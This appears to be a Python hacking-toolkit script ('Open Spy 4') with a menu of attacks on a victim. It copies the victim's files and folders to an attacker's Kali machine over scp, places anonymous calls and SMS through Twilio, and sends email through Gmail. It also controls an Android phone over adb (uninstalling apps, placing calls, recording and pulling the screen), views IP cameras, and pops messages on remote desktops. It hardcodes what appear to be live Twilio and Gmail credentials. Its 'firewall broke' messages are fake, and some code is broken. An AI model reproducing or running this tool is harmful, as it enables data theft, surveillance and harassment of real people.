import subprocess as malfunction
import webbrowser as dosbrowser
import os as sysmal
import pyautogui as crackmal
import pyttsx3
import threading as compslowfunc
import time as cpuperflow
import schedule as lead11
from colorama import Fore as clrmod , Back as b , Style as des
from termcolor import colored as clrmod2, cprint as clrdspl
import pyfiglet as mkbanr
from rich.console import Console
import random
from pygame import mixer as alert
from twilio.rest import Client
from email.message import EmailMessage
import ssl
import smtplib
import winwifi
from rich.progress import track as despgbar
from ssm import ScreenMirrorServer as smrs
from ssm import ScreenMirrorClient as smrc
from adbutils import adb
import instabot 
import cv2 
import numpy as np 
import imutils
import requests
import os as sysmal
import pywhatkit
 

# IF THE LOOP IS NOT REQUIRED, REMOVE IT OR WRITE OTHER CODES BELOW FOR HACKING SYSTEMS.                                                         
# OTHER CODES :-->

alert.init()
print("")
bnr_list = ["Open Spy 4 - By Yash", "O - SPY 4 - YD", "SPY - Terminal - YaSh", ":) OpEn SpY 4 - bY yAsH"]
bnr_font_list = ['slant', 'dotmatrix', 'graffiti', 'banner3-d']
con = Console()
banner = mkbanr.figlet_format(random.choice(bnr_list), font = random.choice(bnr_font_list))
banner_2 = mkbanr.figlet_format("V . 4 . 0")
con.print(banner)
print("////////////////////////////")
print("//////////////////////////")
print("////////////////////////")
print("//////////////////////")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "OPEN", "", "", "", "SPY", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "v", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "|")
print("|", "", "", "", "", "", "", "", "4.0", "", "", "", "", "", "", "", "", "|")
print("(", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ")")
print("", "(", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ")", "")
print("", "", "(", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ")", "", "")
print("", "", "", "(", "", "", "", "", "", "", "", "", "", "", "", "", "", ")", "", "", "")
print("", "", "", "", "((((((((|))))))")
print("", "", "", "", "","(((((((|)))))")
print("", "", "", "", "", "", "(((((|)))))")
print("", "", "", "", "", "", "","(((((|))))")
print("", "", "", "", "", "", "", "(((((|))))")
print("")
print("")
print("")
con.print(banner_2)
print("")
clrdspl("---------------------------------------------------------( $ * $ * $ * $ * $ * $ )----------------------------------------------------------------------------------------------", "cyan")
print("")

connection = clrmod2("[ * ] Connect to ( 1 ) NetX_24 / ( 2 ) realme C65 5G / ( 3 ) vivo T3x 5G ? : ", "yellow")
inpt = input(connection)

if inpt == "1" :
    
    winwifi.WinWiFi.connect("NetHorse25")
    print("")
    clrdspl("INTERNET CONNECTION ESTABLISHMENT SUCCESSFUL....!!!!", "green")
    print("")
    print("")
    
elif inpt == "2" :
    
    winwifi.WinWiFi.connect("realme C65 5G")
    print("")
    clrdspl("INTERNET CONNECTION ESTABLISHMENT SUCCESSFUL....!!!!", "green")
    print("")
    print("")
    
elif inpt == "3" :

    winwifi.WinWiFi.connect("vivo T3x 5G")
    print("")
    clrdspl("INTERNET CONNECTION ESTABLISHMENT SUCCESSFUL....!!!!", "green")
    print("")
    print("")
    
else :
    
    print("")
    
    clrdspl("Could't identify internet access provider....", 'red', 'on_white')
    exit()
    
tx = clrmod2("[*] NOTE : INSTALL THE 'SSH' SERVICE ON YOUR LINUX DEVICE BY TYPING ->", 'blue') 
tx_2 = clrmod2("IN THE TERMINAL. \n", 'blue') 
tx_3 = clrmod2("[*] AFTER THE INSTALLATION IS DONE, TYPE ->", 'blue') 
tx_4 = clrmod2("[*] NOW YOU'VE SUCCESSFULLY ESTABLISHED AN SSH SERVICE FOR TRANSFERRING DATA. \n", 'blue')
tx_5 = clrmod2("'sudo apt-get install openssh-server'", 'green')
tx_6 = clrmod2("'sudo service ssh start'", 'green')
print(tx, tx_5, tx_2)
print(tx_3, tx_6, tx_2)
print(tx_4)
clrdspl("---------------------------------------------------------( $*$*$*$*$*$ )-------------------------------------------------------------------------------------------------------- \n", "cyan")
tx1 = clrmod2("[ * ] Enter your KALI LINUX device's Username & IP Address in this format --> (usr@ipaddress) : ", 'red')
ui = input(tx1)

if "." not in ui or "@" not in ui or "|" in ui or "/" in ui or "^" in ui or "#" in ui or "%" in ui or "*" in ui or "&" in ui or "()" in ui or "!" in ui or "{}" in ui or "[]" in ui or ":" in ui or ";" in ui or "'" in ui or "~" in ui or "<" in ui or ">" in ui or "?" in ui or "," in ui:
    
    clrdspl("FATAL ERROR : UNABLE TO RECOGNIZE THE IP ADDRESS WITH THIS USERNAME !!!!", 'red', 'on_white')
    exit()
    
print("")
print(clrmod2("[ NOTE ] SET USERNAME & IP ADDRESS AS $~ ", 'white') + ui)
print("")

tx_7 = clrmod2("[ * ] Enter your KALI LINUX device's directory / location, where the files will be saved : ", 'yellow')
dir_location = input(tx_7)
print("")
print(clrmod2("[ NOTE ] SET ON - KALI LINUX - DEVICE SAVING LOCATION AS $~ ", 'white') + dir_location)
print("")

tx_14 = clrmod2("[ * ] Enter victim's device's root directory / location : ", 'yellow')
root_location = input(tx_14)
print("")
print(clrmod2("[ NOTE ] SET VICTIM'S DEVICE'S ROOT DIRECTORY / LOCATION AS $~ ", 'white') + root_location)
print("")

tx2 = clrmod2("[ * ] Enter your KALI LINUX device's password : ", 'green')
password = input(tx2)
print("")
print(clrmod2("[ NOTE ] SET PASSWORD WITH RESPECT TO ", 'white') + ui + " AS $~ ", password)
print("")
print("")

# HACK USING WHILE....LOOP. 

file_list = []
file_list_2 = []
file_list_3 = []
file_list_4 = []
file_list_5 = []

for files in sysmal.listdir("C://Users//" + root_location + "//Downloads") :
    
    file_list.append(files)
    
for files2 in sysmal.listdir("C://Users//" + root_location + "//Desktop") :
    
    file_list_2.append(files2)
    
for files3 in sysmal.listdir("C://Users//" + root_location + "//Documents") :
    
    file_list_3.append(files3)
    
for files4 in sysmal.listdir("C://Users//" + root_location + "//Pictures") :
    
    file_list_4.append(files4)
    
for files5 in sysmal.listdir("C://Users//" + root_location + "//Videos") :
    
    file_list_5.append(files5)

def progressbar():
    
    cpuperflow.sleep(0.1)
    
for _ in despgbar( range (100), description = 'Fetching System Files.... ') :

    progressbar()
    
print("")
cpuperflow.sleep(3)
clrdspl("(---: DISPLAYING FOLDERS & FILES :---)", 'cyan', 'on_white')
print("")
print("")
print("[ * ] Downloaded files & folders:", file_list)
print("")
print("")
print("[ * ] Desktop files & folders :", file_list_2)
print("")
print("")
print("[ * ] Document files & folders :", file_list_3)
print("")
print("")
print("[ * ] Pictures files & folders :", file_list_4)
print("")
print("")
print("[ * ] Videos files & folders :", file_list_5)
print("")
print("")

tx3 = clrmod2("[ * ] FETCHING OF ALL SYSTEM FILES & FOLDERS ARE DONE !!!!", 'red')
print(tx3)

print("")

cpuperflow.sleep(1)

repeat_options = True
while repeat_options:
    
    tx_8 = clrmod2("[ * ] Now, choose which hack you wants to perform --> [ 1 ] Hack & Dispatch Specific Files  [ 2 ] Hack & Dispatch Directories  [ 3 ] Do Anonymous Call [ 4 ] Dispatch Anonymous SMS [ 5 ] Dispatch Email [ 6 ] Track Location Using Mobile Number [ 7 ] Mirror / Share Screen of Android Anonymously [ 8 ] Bridge & Bypass Android Shell [ 9 ] Hack IP CCTV & WEBCAM : [ 10 ] Display message on any remote desktop anonymously [ 11 ] Crash Anyone's Whatsapp : ", 'blue', 'on_white')
    action = input(tx_8)

    print("")
    
    if action == "1":
        
        cpuperflow.sleep(1)

        tx_9 = clrmod2("[ * ] Enter the victim's file's location by typing --> cd _directory / location_ : ", 'white')
        action_2 = input(tx_9)
    
        print("")

        tx_10 = clrmod2("[ * ] Enter the victim's file name : ", 'white')
        action_3 = input(tx_10)

        print("")

        cpuperflow.sleep(1)

        tx4 = clrmod2("[ * ] TRYING TO GAIN ACCESS THROUGH FIREWALL....", 'red') 
        print(tx4)

        cpuperflow.sleep(3)
    
        print("")
        print("")

        tx5 = clrmod2("[ * ] FIREWALL BROKE / ACCESS GRANTED ....!!!!", 'cyan')
        print(tx5)
        assist = pyttsx3.init()
        assist.say("FIREWALL SUCCESSFULLY BROKE ACCESS GRANTED !!!!")
        assist.runAndWait()
        print("")
        alert.music.load(r'red-alert_nuclear_buzzer-99741.mp3')
        alert.music.play()
        cpuperflow.sleep(1)

        crackmal.hotkey('win', 'r')

        cpuperflow.sleep(0.5)

        crackmal.press('backspace')

        crackmal.typewrite("cmd")

        cpuperflow.sleep(0.5)

        crackmal.press('enter')

        cpuperflow.sleep(1)

        crackmal.typewrite(action_2)
        crackmal.press('enter')

        crackmal.typewrite("scp")    
        crackmal.press('space')
        crackmal.typewrite(action_3)
        crackmal.press('space')
        crackmal.typewrite(ui + ":" + dir_location)
        crackmal.press('enter')

        cpuperflow.sleep(0.5)

        crackmal.typewrite(password)
        crackmal.press('enter')

        assist = pyttsx3.init()
        assist.say("FILE(S) DISPATCH IS SUCCESSFUL")
        assist.runAndWait()
        
        crackmal.typewrite("exit")
        crackmal.press('enter')
        
        print("")
        print("")
    
    elif action == "2":

        cpuperflow.sleep(1)

        tx_12 = clrmod2("[ * ] Enter the victim's folder / directory's name : ", 'white')
        action_4 = input(tx_12)

        print("")

        cpuperflow.sleep(1) 

        tx4 = clrmod2("[ * ] TRYING TO GAIN ACCESS THROUGH FIREWALL....", 'red') 
        print(tx4)

        print("")
        print("")

        cpuperflow.sleep(3)
    
        tx5 = clrmod2("[ * ] FIREWALL BROKE / ACCESS GRANTED ....!!!!", 'cyan')
        print(tx5)
        assist = pyttsx3.init()
        assist.say("FIREWALL SUCCESSFULLY BROKE ACCESS GRANTED !!!!")
        assist.runAndWait()
        print("")
        alert.music.load(r'C:\Users\Win 10\Downloads\red-alert_nuclear_buzzer-99741.mp3')
        alert.music.play()
        cpuperflow.sleep(1)

        crackmal.hotkey('win', 'r')

        cpuperflow.sleep(0.5)

        crackmal.press('backspace')

        crackmal.typewrite("cmd")

        cpuperflow.sleep(0.5)

        crackmal.press('enter')

        cpuperflow.sleep(1)

        crackmal.typewrite("scp -r")    
        crackmal.press('space')
        crackmal.typewrite(action_4)
        crackmal.press('space')
        crackmal.typewrite(ui + ":" + dir_location)
        crackmal.press('enter')

        cpuperflow.sleep(0.5)

        crackmal.typewrite(password)
        crackmal.press('enter')

        assist.say("DIRECTORY(S) DISPATCH IS SUCCESSFUL")
        assist.runAndWait()
    
        crackmal.typewrite("exit")
        crackmal.press('enter')
        
        print("")
        print("")

    elif action == "3":
    
        cpuperflow.sleep(1)

        tx_13 = clrmod2("[ * ] Enter the victim's phone number : ", 'red')
        action_5 = input(tx_13)
        
        print("")
        
        tx_21 = clrmod2("[ * ] Enter the message that you wants to say via call : ", 'white')
        action_13 = input(tx_21)

        print("")
        clrdspl("Establishing connection with SPACESOFT Indus server....", 'yellow', 'on_blue')
        print("")
        cpuperflow.sleep(4)
        clrdspl("Succesfully established connection with SPACESOFT Indus server....!!!!", 'green', 'on_white')
        print("")
        cpuperflow.sleep(4)
        clrdspl("Succesfully sent the call!!!!", 'green', 'on_white')
        
        print("")
        print("")

        acc_SID = 'AC3505d80cbcb63373c0e0b9860cceb947'
        auth_token = '5795db1e8288c8d58eb05f5bcd6e4db3'
    
        client = Client(acc_SID, auth_token)
    
        Attacker_Number = '+17867583827'
    
        Victim_Number = '+91' + action_5
    
        call = client.calls.create (
        
            twiml = f'<Response><Say>{action_13}</Say></Response>',
            to = Victim_Number,
            from_ = Attacker_Number,
        
        )
        
        print("")
        print("")
        
    elif action == "4":
        
        print("")
        
        cpuperflow.sleep(1)

        tx_19 = clrmod2("[ * ] Enter victim's phone number : ", 'red')
        action_11 = input(tx_19)
        
        print("")

        tx_20 = clrmod2("[ * ] Enter the message : ", 'white')
        action_12 = input(tx_20)

        acc_SID_2 = 'AC3505d80cbcb63373c0e0b9860cceb947'
        auth_token_2 = '5795db1e8288c8d58eb05f5bcd6e4db3'
        
        client_2 = Client(acc_SID_2, auth_token_2)

        Attacker_Number_2 = '+17867583827'
        Victim_Number_2 = '+91' + action_11
        
        print("")
        clrdspl("Establishing connection with SPACESOFT Indus server....", 'yellow', 'on_blue')
        print("")
        cpuperflow.sleep(4)
        clrdspl("Succesfully established connection with SPACESOFT Indus server....!!!!", 'green', 'on_white')
        print("")
        cpuperflow.sleep(4)
        clrdspl("Succesfully sent the messgae!!!!", 'green', 'on_white')

        client_2.messages.create(body = action_12, from_ = Attacker_Number_2, to = Victim_Number_2)
    
        print("")
        print("")
    
    elif action == "5":
        
        cpuperflow.sleep(1)
        
        tx_14 = clrmod2("[ * ] Enter your e-mail : ", 'cyan')
        action_6 = input(tx_14)
        
        print("")

        tx_15 = clrmod2("[ * ] Enter victim's e-mail : ", 'red')
        action_8 = input(tx_15)
        
        print("")

        tx_17 = clrmod2("[ * ] Enter the subject : ", 'red')
        action_9 = input(tx_17)

        print("")

        tx_18 = clrmod2("[ * ] Enter the e-mail message / body : ", 'red')
        action_10 = input(tx_18)
        
        print("")
        clrdspl("Establishing connection with Gmail smtp....", 'white', 'on_cyan')
        cpuperflow.sleep(2)
        
        print("")
        clrdspl("Established connection with Gmail & smtp server....!!!!", 'white', 'on_cyan')
        cpuperflow.sleep(2)

        print("")
        clrdspl("Generating e-mail message....", 'white', 'on_cyan')
        cpuperflow.sleep(3)
        
        complete_mail = f"SUBJECT : {action_9}\n\nMESSAGE : {action_10}"

        print("")
        clrdspl("Successfully Generated & Sent e-mail message....", 'green', 'on_white')

        Attacker_Email = action_6
        Victim_Email = action_8
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        
        server.login(Attacker_Email, "fiwq keum zhhy vgwq")
        
        server.sendmail(Attacker_Email, Victim_Email, complete_mail)
        
        print("")
        print("")

    elif action == "6":
        
        assist = pyttsx3.init()

        cpuperflow.sleep(1)

        tx_16 = clrmod2("[ * ] Enter the victim's phone number : ", 'red')
        action_7 = input(tx_16)
        
        cpuperflow.sleep(2)

        print("")
        clrdspl("Establishing connection with EMT server....", 'yellow', 'on_blue')
        print("")
        cpuperflow.sleep(5)
        clrdspl("Succesfully established connection with EMT server....!!!!", 'green', 'on_white')
        cpuperflow.sleep(0.5)
        dosbrowser.open("https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwiUnv-v9siGAxXp1TgGHSzpCcgQFnoECAgQAQ&url=https%3A%2F%2Fwww.emobiletracker.com%2F&usg=AOvVaw0Umd-zrkbBFBbY2tjndZF4&opi=89978449")
        cpuperflow.sleep(8)
        crackmal.leftClick(x = 414, y = 403)
        crackmal.typewrite(action_7)
        crackmal.press('enter')
        
        cpuperflow.sleep(1)
        
        assist.say("PHONE NUMBER LOCATION TRACED")
        assist.runAndWait()
        
        print("")
        print("")
        
    elif action == "7" :
        
        print("")
        print("")
            
        clrdspl("HoStInG tO iNdUs SeRvEr....", 'white', 'on_blue')
        cpuperflow.sleep(2)
        print("")
        clrdspl("HoStInG tO iNdUs SeRvEr WaS SuCcEsSfUl !!!!....", 'white', 'on_blue')
        
        cpuperflow.sleep(2)
        
        print("")

        clrdspl("ALLOW BRIDGING PERMISSION ON THE CONNECTED DEVICE .... DELAYING PROGRAM EXECUTION FOR 6 SECS ....", 'red', 'on_white')

        crackmal.hotkey('win', 'r')
        cpuperflow.sleep(1)
        crackmal.press('backspace')
        crackmal.typewrite("cmd")
        crackmal.press('enter')
        cpuperflow.sleep(2)
        crackmal.typewrite("adb devices")
        crackmal.press('enter')
        
        cpuperflow.sleep(2)

        On_Loop = True
        while On_Loop :

            print("")

            text2 = clrmod2("Enter IP Address of victim's ANDROID Phone : ", 'red')
            ui2 = input(text2)
        
            print("")

            text3 = clrmod2("Enter Any Port number : ", 'red')
            ui3 = input(text3)

            cpuperflow.sleep(6)
        
            crackmal.typewrite("adb devices")
            crackmal.press('enter')
        
            cpuperflow.sleep(2)
        
            crackmal.typewrite("scrcpy")
            crackmal.press('enter')
        
            cpuperflow.sleep(2)
        
            clrdspl("Anonymous Mirroring Successful !!!!....")
            assist2 = pyttsx3.init()
            assist2.say("Anonymous Mirroring Successful")
            assist2.runAndWait()
            
            if ui2 == "EXIT" or ui2 == "exit" or ui3 == "EXIT" or ui3 == "exit" :
                
                On_Loop == False

        print("")
        print("")
    
    elif action == "8" :
        
        print("")

        clrdspl("ALLOW BRIDGING PERMISSION ON THE CONNECTED DEVICE .... DELAYING PROGRAM EXECUTION FOR 6 SECS ....", 'red', 'on_white')
        
        crackmal.hotkey('win', 'r')
        cpuperflow.sleep(1)
        crackmal.press('backspace')
        crackmal.typewrite("cmd")
        crackmal.press('enter')
        cpuperflow.sleep(2)
        crackmal.typewrite("adb devices")
        crackmal.press('enter')
        
        cpuperflow.sleep(6)

        print("")

        comnd = clrmod2("[ 1 ] Get Android Version. [ 2 ] Uninstall App Package (com.apppackagename) [ 3 ] Uninstall App Package (With Cache Data) [ 4 ] Get Installed Apk File Path On Your PC [ 5 ] Re - Install / Update Package [ 6 ] Send Call Anonymously [ 7 ] Send SMSs Anonymously [ 8 ] Type Anonymously [ 9 ] Record Screen & Pull the file to your system anonymously [ 10 ] Install New Application Anonymously : ", "red")
            
        ANDROSHELLBYPASS_ON_LOOP = True
            
        while ANDROSHELLBYPASS_ON_LOOP :
                
            command = input(comnd)
            
            if command == "1" :
                
                print("")
                print("")
                    
                sysmal.system(" cmd /c adb shell getprop ro.build.version.release")
                    
            elif command == "2" :
                    
                print("")
                print("")
                
                loop5 = True
                while loop5 :
                    
                    Sugg6 = clrmod2("Enter the app package name perfectly that you wants to install on the victim's phone : ", 'green')
                    Res6 = input(Sugg6)
                    
                    sysmal.system(f"adb uninstall com.{Res6}")
                    
                    if Res6 == "EXIT" or Res6 == "exit" :
                        
                        loop5 = False
                    
            elif command == "3" :
                    
                print("")
                print("")
                
                sysmal.system(' cmd /c "adb shell getprop ro.build.version.release" ')
                    
            elif command == "4" : 

                print("")
                print("")
                
                loop4 = True
                while loop4 :
                    
                    Sugg5 = clrmod2("Enter the app name perfectly that you wants to install on the victim's phone : ", 'green')
                    Res5 = input(Sugg5)
                    
                    sysmal.system(f"adb -d install storage/emulated/0/Download/{Res5}.apk")
                    
                    if Res5 == "EXIT" or Res5 == "exit" :
                        
                        loop4 = False
                    
            elif command == "5" :
                    
                print("")
                print("")
                
                sysmal.system(' cmd /c "adb shell getprop ro.build.version.release" ')
                
            elif command == "6" :
                    
                print("")
                print("")
                
                loop2 = True
                while loop2 :
                    
                    Sugg2 = clrmod2("Enter the phone number on which you wants to call : ", 'cyan')
                    Res2 = input(Sugg2)
                    
                    sysmal.system(f" cmd /c adb shell am start -a android.intent.action.CALL -d tel:{Res2}")
                    
                    if Res2 == "EXIT" or Res2 == "exit" :
                        
                        loop2 = False
                
            elif command == "7" :
                    
                print("")
                print("")
                
                loop3 = True
                while loop3 :
                    
                    Sugg3 = clrmod2("Enter the phone number to which you wants to send the sms : ", 'green')
                    Res3 = input(Sugg3)
                    
                    print("")

                    Sugg4 = clrmod2("Enter the sms that you wants to send : ", 'green')
                    Res4 = input(Sugg4)
                    
                    sysmal.system(f" cmd /c adb shell am start -a android.intent.action.SENDTO -d sms:{Res3} --es sms_body '{Res4}' ")
                    sysmal.system(" cmd /c adb shell input keyevent 22")
                    sysmal.system(" cmd /c adb shell input keyevent 66")
                    
                    if Res3 == "EXIT" or Res3 == "exit" :
                        
                        loop3 = False
                
            elif command == "8" :
                
                print("")
                print("")
                
                loop = True
                while loop :
                    
                    Sugg = clrmod2("Enter the text that you wants to type : ", 'green')
                    Res = input(Sugg)
                
                    sysmal.system(f" cmd /c adb shell input text '{Res}' ")
                    
                    if Res == "EXIT" or Res == "exit" :
                        
                        loop = False

            elif command == "9" :
                
                print("")
                print("")

                enquire_time = clrmod2("Enter Screen Recording Time [ IN SECONDS ] : ", "green")

                time = input(enquire_time)

                sysmal.system(f"adb shell screenrecord --size 800x1000 --time-limit {time} --verbose sdcard/reqsystem.mp4")

                sysmal.system('exit')

                sysmal.system("adb pull sdcard/reqsystem.mp4")

                print("")

                clrdspl("SPIED FILE PULLED SUCCESSFULLY....!!!!,", "red")

            elif command == "10" :

                enquire_app_id = clrmod2("Enter the APK - APP - ID perfectly that you wants to install on the victim's phone : ", 'green')
                app_id = input(Sugg5)

                sysmal.system("cd AndroAppLodger")
                cpuperflow.sleep(1)
                sysmal.system(f"adb install .\{app_id}")
                
            elif command == "EXIT" or command == "exit" :
                    
                ANDROSHELLBYPASS_ON_LOOP = False
    
    elif action == "9" :

        print("")
        print("")
        
        Suggestion_Text = clrmod2("Wants to execute the hack in infinite loop ? [ Y / N ] : ", 'red')
        Suggestion = input(Suggestion_Text)
        
        if Suggestion == "Y" or Suggestion == "y" :
            
            print("")

            loop6 = True 
            while loop6 :
                
                IP_TEXT_3 = clrmod2("Enter victim's IP Address of CCTV / WEBCAM : ", 'cyan')
                PORT_TEXT = clrmod2("Enter the device's Port No. : ", 'green')

                IP = input(IP_TEXT_3)
                PORT = input(PORT_TEXT)
                
                url = f"http://{IP}:{PORT}/shot.jpg"
  
                print("")

                while True : 

                    img_resp = requests.get(url) 
                    img_arr = np.array(bytearray(img_resp.content), dtype=np.uint8) 
                    img = cv2.imdecode(img_arr, -1) 
                    img = imutils.resize(img, width=1000, height=1000) 
                    cv2.imshow("VICTIM'S IP CCTV / WEBCAM'S VIEW", img) 
  
                    if cv2.waitKey(1) == 27: 
        
                        break
  
                cv2.destroyAllWindows()
                
        if Suggestion == "N" or Suggestion == "n" :

            IP_TEXT_3 = clrmod2("Enter victim's IP Address of CCTV / WEBCAM : ", 'cyan')
            PORT_TEXT = clrmod2("Enter the device's Port No. : ", 'green')

            IP = input(IP_TEXT_3)
            PORT = input(PORT_TEXT)
                
            url = f"http://{IP}:{PORT}/shot.jpg"
  
            print("")

            while True : 

                img_resp = requests.get(url) 
                img_arr = np.array(bytearray(img_resp.content), dtype=np.uint8) 
                img = cv2.imdecode(img_arr, -1) 
                img = imutils.resize(img, width=1000, height=1000) 
                cv2.imshow("VICTIM'S IP CCTV / WEBCAM'S VIEW", img) 
  
                if cv2.waitKey(1) == 27: 
        
                    break
  
            cv2.destroyAllWindows()

    elif action == "10" :

        print("")
        print("")

        go_on = True

        while go_on :

            enquire_ip = clrmod2(f"Enter the Systen IP you wants to target : ", "red")
            ip = input(enquire_ip)

            enquire_mesg = clrmod2(f"Write the message you wants to display : ", "green")
            mesg = input(enquire_mesg)

            sysmal.system(f" msg * /server:{ip} '{mesg}' ")

            print("")

            clrdspl("MESSAGE SENT & DISPLAYED SUCCESSFULLY ON TARGET SYSTEM....!!!!", "blue", "on_white")

            print("")
            print("")

            if mesg == "EXIT" or mesg == "exit" :

                go_on = False

            elif ip == "EXIT" or ip == "exit" :

                go_on = False

    elif action == "11" :

        print("")
        print("")

        ph_q = clrmod("Enter the phone numbner : ")
        ph_data = input(ph_q) 

        print("")

        interval_q = clrmod2("Enter the start interval of time : ", 'yellow')
        interval_data = input(interval_q)

        print("")

        interval_2_q = clrmod2("Enter the end interval of time : ", 'yellow')
        interval_2_data = input(interval_2_q)

        cpuperflow.sleep(2)

        pywhatkit.sendwhatmsg_instantly(ph_data, "wa.me/settings", interval_data, False, interval_2_data)

    elif action == "exit" or action == "EXIT" :
        
        repeat_options = False
        
        discnct = clrmod2(f"Wants to remain connected with {inpt} ISP ? Y/N : ", "red")
        disconnect = input(discnct)
    
        if disconnect == "Y" or disconnect == "y" :
            
            exit()

        elif disconnect == "N" or disconnect == "n" :
            
            winwifi.WinWiFi.disconnect()
            exit()